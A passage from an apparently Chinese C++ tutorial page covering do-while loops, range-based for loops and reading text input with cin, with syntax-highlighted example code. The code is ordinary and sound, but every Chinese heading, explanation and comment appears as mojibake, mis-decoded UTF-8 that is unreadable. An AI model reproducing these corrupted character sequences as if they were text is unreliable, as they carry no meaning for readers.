å¾ªç¯ä½“è‡³å°‘æ‰§è¡Œä¸€æ¬¡ä»¥è·å–è¾“å…¥</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter a positive number: &quot;</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; number;</span><br><span class="line">        <span class="keyword">if</span> (number &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Invalid input. Please try again.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (number &lt;= <span class="number">0</span>); <span class="comment">// æ¡ä»¶åœ¨è¾“å…¥ä¹‹åæ£€æŸ¥</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You entered the positive number: &quot;</span> &lt;&lt; number &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ¯”è¾ƒ: å¦‚æœä½¿ç”¨ whileï¼Œéœ€è¦å…ˆè·å–ä¸€æ¬¡è¾“å…¥</span></span><br><span class="line">    <span class="comment">// int number_while;</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;\nEnter a positive number (using while): &quot;;</span></span><br><span class="line">    <span class="comment">// std::cin &gt;&gt; number_while;</span></span><br><span class="line">    <span class="comment">// while (number_while &lt;= 0) &#123;</span></span><br><span class="line">    <span class="comment">//     std::cout &lt;&lt; &quot;Invalid input. Please try again.&quot; &lt;&lt; std::endl;</span></span><br><span class="line">    <span class="comment">//     std::cout &lt;&lt; &quot;Enter a positive number (using while): &quot;;</span></span><br><span class="line">    <span class="comment">//     std::cin &gt;&gt; number_while;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;You entered: &quot; &lt;&lt; number_while &lt;&lt; std::endl;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å³ä½¿æ¡ä»¶åˆå§‹ä¸º falseï¼Œå¾ªç¯ä½“ä¹Ÿæ‰§è¡Œä¸€æ¬¡</span></span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">5</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nStarting do-while with count = 5 (condition count &lt; 5 is false):&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Inside do-while loop, count = &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¿™è¡Œä¼šæ‰§è¡Œ</span></span><br><span class="line">        count++;</span><br><span class="line">    &#125; <span class="keyword">while</span> (count &lt; <span class="number">5</span>); <span class="comment">// ç¬¬ä¸€æ¬¡æ£€æŸ¥æ—¶ count æ˜¯ 6, æ¡ä»¶ä¸º false</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After do-while loop, count = &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// count å˜ä¸º 6</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ä¸ <code>while</code> å’Œ <code>for</code> çš„æ¯”è¾ƒ:</strong></p><ul><li>  <strong><code>while</code>:</strong> å…¥å£æ¡ä»¶ï¼Œå¯èƒ½ä¸€æ¬¡éƒ½ä¸æ‰§è¡Œã€‚</li><li>  <strong><code>for</code>:</strong> é€šå¸¸ç”¨äºè®¡æ•°æˆ–å·²çŸ¥è¿­ä»£æ¬¡æ•°ï¼Œç»“æ„åŒ…å«åˆå§‹åŒ–ã€æ¡ä»¶ã€æ›´æ–°ã€‚</li><li>  <strong><code>do while</code>:</strong> å‡ºå£æ¡ä»¶ï¼Œä¿è¯è‡³å°‘æ‰§è¡Œä¸€æ¬¡ã€‚</li></ul><p>æ ¹æ®å¾ªç¯é€»è¾‘é€‰æ‹©æœ€åˆé€‚çš„å¾ªç¯ç»“æ„å¯ä»¥ä½¿ä»£ç æ›´æ¸…æ™°ã€æ›´æ˜“äºç†è§£ã€‚å¦‚æœéœ€è¦ç¡®ä¿æ“ä½œè‡³å°‘å‘ç”Ÿä¸€æ¬¡ï¼ˆå¦‚èœå•é€‰æ‹©ã€è¾“å…¥éªŒè¯ï¼‰ï¼Œ<code>do while</code> æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„é€‰æ‹©ã€‚</p><h2 id="5-4-åŸºäºèŒƒå›´çš„forå¾ªç¯ï¼ˆC-11ï¼‰"><a href="#5-4-åŸºäºèŒƒå›´çš„forå¾ªç¯ï¼ˆC-11ï¼‰" class="headerlink" title="5.4 åŸºäºèŒƒå›´çš„forå¾ªç¯ï¼ˆC++11ï¼‰"></a>5.4 åŸºäºèŒƒå›´çš„forå¾ªç¯ï¼ˆC++11ï¼‰</h2><p>C++11 å¼•å…¥äº†ä¸€ç§æ›´ç®€æ´ã€æ›´æ˜“è¯»çš„ <code>for</code> å¾ªç¯è¯­æ³•ï¼Œç§°ä¸º<strong>åŸºäºèŒƒå›´çš„ for å¾ªç¯ (Range-Based for Loop)</strong> æˆ– <strong>å¢å¼º for å¾ªç¯ (Enhanced for Loop)**ã€‚å®ƒä¸“é—¨ç”¨äº</strong>éå†ä¸€ä¸ªåºåˆ—ï¼ˆæˆ–èŒƒå›´ï¼‰ä¸­çš„æ‰€æœ‰å…ƒç´ **ï¼Œä¾‹å¦‚æ•°ç»„ã€STL å®¹å™¨ï¼ˆå¦‚ <code>vector</code>, <code>array</code>, <code>string</code>ï¼‰ã€åˆå§‹åŒ–åˆ—è¡¨ç­‰ã€‚</p><p><strong>ç›®çš„:</strong> ç®€åŒ–éå†æ“ä½œï¼Œå‡å°‘æ‰‹åŠ¨ç®¡ç†ç´¢å¼•æˆ–è¿­ä»£å™¨çš„ä»£ç ï¼Œé¿å…å¸¸è§çš„å·®ä¸€é”™è¯¯ (off-by-one errors)ã€‚</p><p><strong>è¯­æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (declaration : range_expression) &#123;</span><br><span class="line">    <span class="comment">// å¾ªç¯ä½“</span></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ declaration è®¿é—®å½“å‰å…ƒç´ </span></span><br><span class="line">    statement;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong><code>declaration</code></strong>: å£°æ˜ä¸€ä¸ªå˜é‡ï¼Œå…¶ç±»å‹åº”ä¸ <code>range_expression</code> ä¸­å…ƒç´ çš„ç±»å‹å…¼å®¹ï¼ˆæˆ–å¯ä»¥è½¬æ¢ï¼‰ã€‚åœ¨æ¯æ¬¡å¾ªç¯è¿­ä»£ä¸­ï¼Œè¯¥å˜é‡ä¼šè¢«åˆå§‹åŒ–ä¸ºèŒƒå›´ä¸­çš„å½“å‰å…ƒç´ ã€‚<ul><li>  é€šå¸¸ä½¿ç”¨ <code>auto</code> è®©ç¼–è¯‘å™¨è‡ªåŠ¨æ¨æ–­ç±»å‹ã€‚</li><li>  <code>auto variable</code>: <code>variable</code> ä¼šæˆä¸ºå½“å‰å…ƒç´ çš„<strong>å‰¯æœ¬</strong>ã€‚ä¿®æ”¹ <code>variable</code> ä¸ä¼šå½±å“åŸå§‹åºåˆ—ä¸­çš„å…ƒç´ ã€‚</li><li>  <code>auto&amp; variable</code>: <code>variable</code> ä¼šæˆä¸ºå½“å‰å…ƒç´ çš„<strong>å¼•ç”¨</strong>ã€‚ä¿®æ”¹ <code>variable</code> <strong>ä¼š</strong>ä¿®æ”¹åŸå§‹åºåˆ—ä¸­çš„å…ƒç´ ã€‚ç”¨äºéœ€è¦ä¿®æ”¹å…ƒç´ æˆ–é¿å…å¤åˆ¶å¤§å‹å¯¹è±¡å¼€é”€çš„æƒ…å†µã€‚</li><li>  <code>const auto&amp; variable</code>: <code>variable</code> ä¼šæˆä¸ºå½“å‰å…ƒç´ çš„<strong>å¸¸é‡å¼•ç”¨</strong>ã€‚ä¸èƒ½é€šè¿‡ <code>variable</code> ä¿®æ”¹å…ƒç´ ï¼Œä½†å¯ä»¥é¿å…å¤åˆ¶å¼€é”€ã€‚ç”¨äºåªè¯»è®¿é—®ã€‚</li></ul></li><li>  <strong><code>:</code></strong>: ç”¨äºåˆ†éš”å£°æ˜å’ŒèŒƒå›´è¡¨è¾¾å¼ã€‚</li><li><strong><code>range_expression</code></strong>: ä¸€ä¸ªå¯ä»¥è¡¨ç¤ºåºåˆ—çš„è¡¨è¾¾å¼ã€‚è¿™é€šå¸¸æ˜¯ï¼š<ul><li>  æ•°ç»„åã€‚</li><li>  STL å®¹å™¨å¯¹è±¡ï¼ˆå¦‚ <code>std::vector</code>, <code>std::array</code>, <code>std::string</code>, <code>std::list</code> ç­‰ï¼‰ã€‚</li><li>  åˆå§‹åŒ–åˆ—è¡¨ <code>&#123; ... &#125;</code>ã€‚</li><li>  ä»»ä½•å®šä¹‰äº† <code>begin()</code> å’Œ <code>end()</code> æˆå‘˜å‡½æ•°æˆ–å¯ä»¥é€šè¿‡å…¨å±€ <code>begin()</code> å’Œ <code>end()</code> å‡½æ•°è·å–è¿­ä»£å™¨çš„å¯¹è±¡ã€‚</li></ul></li></ul><p><strong>æ‰§è¡Œæµç¨‹:</strong></p><p>å¾ªç¯ä¼šè‡ªåŠ¨éå† <code>range_expression</code> ä¸­çš„æ¯ä¸€ä¸ªå…ƒç´ ã€‚åœ¨æ¯æ¬¡è¿­ä»£ä¸­ï¼š</p><ol><li> ä»åºåˆ—ä¸­è·å–ä¸‹ä¸€ä¸ªå…ƒç´ ã€‚</li><li> å°†è¯¥å…ƒç´ çš„å€¼ï¼ˆæˆ–å¼•ç”¨ï¼‰èµ‹ç»™ <code>declaration</code> ä¸­å£°æ˜çš„å˜é‡ã€‚</li><li> æ‰§è¡Œå¾ªç¯ä½“ã€‚</li><li> é‡å¤æ­¤è¿‡ç¨‹ï¼Œç›´åˆ°éå†å®Œåºåˆ—ä¸­çš„æ‰€æœ‰å…ƒç´ ã€‚</li></ol><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;array&gt; // ä¸ºäº† std::array</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 1. éå†æ•°ç»„</span></span><br><span class="line">    <span class="keyword">double</span> prices[] = &#123;<span class="number">19.99</span>, <span class="number">25.50</span>, <span class="number">9.75</span>, <span class="number">100.0</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Prices (array):&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">double</span> price : prices) &#123; <span class="comment">// price æ˜¯æ¯ä¸ªå…ƒç´ çš„å‰¯æœ¬</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; price;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. éå† std::vector</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; numbers = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Numbers (vector):&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> num : numbers) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; num;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. éå† std::string</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> message = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Characters (string):&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">char</span> c : message) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. éå†åˆå§‹åŒ–åˆ—è¡¨</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Initializer list:&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> x : &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>&#125;) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. ä½¿ç”¨ auto ç®€åŒ–å£°æ˜</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>, 3&gt; fruits &#123;<span class="string">&quot;Apple&quot;</span>, <span class="string">&quot;Banana&quot;</span>, <span class="string">&quot;Cherry&quot;</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Fruits (array with auto):&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> fruit : fruits) &#123; <span class="comment">// fruit æ˜¯ std::string çš„å‰¯æœ¬</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; fruit;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. ä½¿ç”¨å¼•ç”¨ä¿®æ”¹å…ƒç´  (auto&amp;)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; scores = &#123;<span class="number">70</span>, <span class="number">85</span>, <span class="number">90</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Original scores:&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> score : scores) <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; score;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; score_ref : scores) &#123; <span class="comment">// score_ref æ˜¯å…ƒç´ çš„å¼•ç”¨</span></span><br><span class="line">        score_ref += <span class="number">5</span>; <span class="comment">// ç»™æ¯ä¸ªåˆ†æ•°åŠ  5</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Scores after adding 5:&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> score : scores) <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; score; <span class="comment">// è¾“å‡ºä¿®æ”¹åçš„åˆ†æ•°</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7. ä½¿ç”¨å¸¸é‡å¼•ç”¨è¿›è¡Œåªè¯»è®¿é—® (const auto&amp;)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Reading scores (const auto&amp;):&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span>&amp; score_cref : scores) &#123;</span><br><span class="line">        <span class="comment">// score_cref += 1; // é”™è¯¯! ä¸èƒ½é€šè¿‡å¸¸é‡å¼•ç”¨ä¿®æ”¹</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; score_cref;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ä¼˜ç‚¹:</strong></p><ul><li>  <strong>ç®€æ´:</strong> ä»£ç æ›´çŸ­ï¼Œæ„å›¾æ›´æ¸…æ™°ï¼ˆâ€œå¯¹èŒƒå›´ä¸­çš„æ¯ä¸ªå…ƒç´ åšæŸäº‹â€ï¼‰ã€‚</li><li>  <strong>å®‰å…¨:</strong> é¿å…äº†æ‰‹åŠ¨ç®¡ç†ç´¢å¼•æˆ–è¿­ä»£å™¨å¯èƒ½å¯¼è‡´çš„é”™è¯¯ï¼ˆå¦‚è¶Šç•Œè®¿é—®ã€è¿­ä»£å™¨å¤±æ•ˆç­‰ï¼‰ã€‚</li><li>  <strong>é€šç”¨:</strong> é€‚ç”¨äºæ‰€æœ‰å®šä¹‰äº† <code>begin()</code> å’Œ <code>end()</code> çš„æ ‡å‡†å®¹å™¨ä»¥åŠå†…ç½®æ•°ç»„å’Œåˆå§‹åŒ–åˆ—è¡¨ã€‚</li></ul><p><strong>å±€é™æ€§:</strong></p><ul><li><strong>æ— æ³•ç›´æ¥è·å–ç´¢å¼•:</strong> å¦‚æœåœ¨å¾ªç¯ä¸­éœ€è¦çŸ¥é“å½“å‰å…ƒç´ çš„ç´¢å¼•ï¼ŒåŸºäºèŒƒå›´çš„ for å¾ªç¯æœ¬èº«ä¸æä¾›è¿™ä¸ªä¿¡æ¯ã€‚éœ€è¦é¢å¤–ç»´æŠ¤ä¸€ä¸ªè®¡æ•°å™¨å˜é‡ã€‚  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; data = &#123;<span class="number">100</span>, <span class="number">200</span>, <span class="number">300</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> val : data) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Index &quot;</span> &lt;&lt; index &lt;&lt; <span class="string">&quot;: &quot;</span> &lt;&lt; val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    index++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>  <strong>éå†æ•´ä¸ªèŒƒå›´:</strong> å®ƒæ€»æ˜¯ä»å¤´åˆ°å°¾éå†æ•´ä¸ªèŒƒå›´ã€‚å¦‚æœéœ€è¦æ›´å¤æ‚çš„éå†æ¨¡å¼ï¼ˆå¦‚åå‘ã€è·³è·ƒã€åªéå†éƒ¨åˆ†èŒƒå›´ï¼‰ï¼Œä¼ ç»Ÿçš„ <code>for</code> å¾ªç¯æˆ– <code>while</code> å¾ªç¯é…åˆè¿­ä»£å™¨å¯èƒ½æ›´åˆé€‚ã€‚</li><li>  <strong>ä¿®æ”¹å®¹å™¨å¤§å°:</strong> åœ¨å¾ªç¯ä½“å†…ä¿®æ”¹å®¹å™¨çš„å¤§å°ï¼ˆä¾‹å¦‚ï¼Œåœ¨ <code>vector</code> ä¸­ <code>push_back</code> æˆ– <code>erase</code>ï¼‰é€šå¸¸æ˜¯ä¸å®‰å…¨çš„ï¼Œå¯èƒ½å¯¼è‡´è¿­ä»£å™¨å¤±æ•ˆå’Œæœªå®šä¹‰è¡Œä¸ºã€‚åŸºäºèŒƒå›´çš„ for å¾ªç¯ä¸é€‚åˆè¿™ç§æƒ…å†µã€‚</li></ul><p><strong>æ€»ç»“:</strong></p><p>åŸºäºèŒƒå›´çš„ <code>for</code> å¾ªç¯æ˜¯ C++11 æä¾›çš„ä¸€ä¸ªéå¸¸æœ‰ç”¨çš„ç‰¹æ€§ï¼Œæå¤§åœ°ç®€åŒ–äº†å¯¹åºåˆ—ä¸­æ‰€æœ‰å…ƒç´ çš„éå†æ“ä½œã€‚åœ¨ä¸éœ€è¦ç´¢å¼•ä¸”éœ€è¦éå†æ•´ä¸ªåºåˆ—çš„æƒ…å†µä¸‹ï¼Œå®ƒé€šå¸¸æ˜¯æ¯”ä¼ ç»Ÿ <code>for</code> å¾ªç¯æ›´ä¼˜é€‰ã€æ›´å®‰å…¨ã€æ›´æ˜“è¯»çš„é€‰æ‹©ã€‚</p><h2 id="5-5-å¾ªç¯å’Œæ–‡æœ¬è¾“å…¥"><a href="#5-5-å¾ªç¯å’Œæ–‡æœ¬è¾“å…¥" class="headerlink" title="5.5 å¾ªç¯å’Œæ–‡æœ¬è¾“å…¥"></a>5.5 å¾ªç¯å’Œæ–‡æœ¬è¾“å…¥</h2><p>å¾ªç¯ç»“æ„åœ¨å¤„ç†æ–‡æœ¬è¾“å…¥æ—¶éå¸¸æœ‰ç”¨ï¼Œç‰¹åˆ«æ˜¯å½“æˆ‘ä»¬éœ€è¦é€ä¸ªå­—ç¬¦æˆ–é€è¡Œè¯»å–æ•°æ®ï¼Œç›´åˆ°æ»¡è¶³æŸä¸ªæ¡ä»¶ï¼ˆå¦‚é‡åˆ°ç‰¹å®šå­—ç¬¦ã€æ–‡ä»¶ç»“æŸæˆ–è¾¾åˆ°ä¸€å®šæ•°é‡ï¼‰æ—¶ã€‚æœ¬èŠ‚å°†æ¢è®¨ä½¿ç”¨ <code>cin</code> åŠå…¶ç›¸å…³æ–¹æ³•è¿›è¡Œæ–‡æœ¬è¾“å…¥çš„å¸¸è§æ¨¡å¼å’ŒæŠ€å·§ã€‚</p><h3 id="5-5-1-ä½¿ç”¨åŸå§‹çš„cinè¿›è¡Œè¾“å…¥"><a href="#5-5-1-ä½¿ç”¨åŸå§‹çš„cinè¿›è¡Œè¾“å…¥" class="headerlink" title="5.5.1 ä½¿ç”¨åŸå§‹çš„cinè¿›è¡Œè¾“å…¥"></a>5.5.1 ä½¿ç”¨åŸå§‹çš„cinè¿›è¡Œè¾“å…¥</h3><p>æˆ‘ä»¬å·²ç»çŸ¥é“ï¼Œä½¿ç”¨ <code>cin &gt;&gt; variable</code> å¯ä»¥ä»æ ‡å‡†è¾“å…¥è¯»å–æ•°æ®ã€‚å½“ç”¨äºè¯»å–æ–‡æœ¬ï¼ˆå¦‚ <code>char</code> æˆ– <code>string</code>ï¼‰æ—¶ï¼Œ<code>cin &gt;&gt;</code> çš„è¡Œä¸ºç‰¹ç‚¹æ˜¯ï¼š</p><ol><li> <strong>è·³è¿‡ç©ºç™½:</strong> å®ƒä¼šè‡ªåŠ¨å¿½ç•¥è¾“å…¥æµä¸­å¼€å¤´çš„ä»»ä½•ç©ºç™½å­—ç¬¦ï¼ˆç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢è¡Œç¬¦ï¼‰ã€‚</li><li> <strong>è¯»å–ç›´åˆ°ç©ºç™½:</strong> å®ƒä¼šè¯»å–éç©ºç™½å­—ç¬¦ï¼Œç›´åˆ°é‡åˆ°ä¸‹ä¸€ä¸ªç©ºç™½å­—ç¬¦ä¸ºæ­¢ã€‚</li><li> <strong>ç©ºç™½ç¬¦ç•™åœ¨æµä¸­:</strong> åœæ­¢è¯»å–æ—¶é‡åˆ°çš„é‚£ä¸ªç©ºç™½å­—ç¬¦ä¼š<strong>ç•™åœ¨</strong>è¾“å…¥æµï¼ˆè¾“å…¥ç¼“å†²åŒºï¼‰ä¸­ï¼Œç­‰å¾…ä¸‹ä¸€æ¬¡è¯»å–æ“ä½œã€‚</li></ol><p>è¿™ä½¿å¾— <code>cin &gt;&gt;</code> é€‚åˆè¯»å–å•ä¸ªå•è¯æˆ–ä»¥ç©ºç™½åˆ†éš”çš„æ•°æ®é¡¹ï¼Œä½†ä¸é€‚åˆè¯»å–åŒ…å«ç©ºæ ¼çš„æ•´è¡Œæ–‡æœ¬æˆ–ç²¾ç¡®åœ°é€ä¸ªå­—ç¬¦å¤„ç†ï¼ˆåŒ…æ‹¬ç©ºæ ¼ï¼‰ã€‚</p><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> word;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter some characters (e.g., &#x27;a b c&#x27;): 